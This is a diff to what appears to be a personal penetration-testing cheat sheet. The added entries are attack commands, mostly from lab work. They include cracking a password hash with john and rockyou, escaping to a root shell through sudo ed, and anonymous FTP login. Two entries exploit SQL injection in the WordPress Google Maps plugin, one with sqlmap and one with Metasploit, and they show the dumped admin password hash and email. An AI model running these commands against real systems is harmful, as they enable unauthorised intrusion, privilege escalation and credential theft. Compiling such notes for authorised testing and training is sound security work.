@@ -128,6 +128,7 @@ hashcat -m 0 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt #
 
 ssh2john id_ed25519 > ssh.hash # ssh
 john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt # ssh
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 # AWS
 aws configure --profile facts
@@ -405,6 +406,49 @@ sudo /usr/bin/vim
 :set shell=/bin/sh
 :shell
 
+# ed
+sudo /usr/bin/ed
+!/bin/sh
+
+# ALL
+sudo su
+
+
+```
+
+# FTP
+### Anonymous Conection
+```bash
+ftp anonymous@192.168.1.153
+
+
+```
+
+# SQLMAP
+```bash
+sqlmap -u "http://192.168.1.9/index.php?rest_route=/wpgmza/v1/markers/&filter={}&fields=*" -p fields --level=2 --risk=1 --batch --dump -T wp_users
+
++----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url | user_pass                          | user_email           | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | <blank>  | $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 | webmaster@none.local | webmaster  | 0           | webmaster    | webmaster     | 2019-09-09 12:54:30 | <blank>             |
++----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+
+```
+
+# METASPLOIT
+```bash
+# SQL Injection
+msfconsole
+search wp_google_maps
+use auxiliary/admin/http/wp_google_maps_sqli
+set RHOSTS 192.168.1.9
+run
+
+# ans
+[+] Credentials saved in: /home/edgerunner/.msf4/loot/20261115182546_default_192.168.1.9_wp_google_maps.j_505623.bin
+[+] 192.168.1.9:80 - Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local
+[*] Auxiliary module execution completed
 
 ```
 
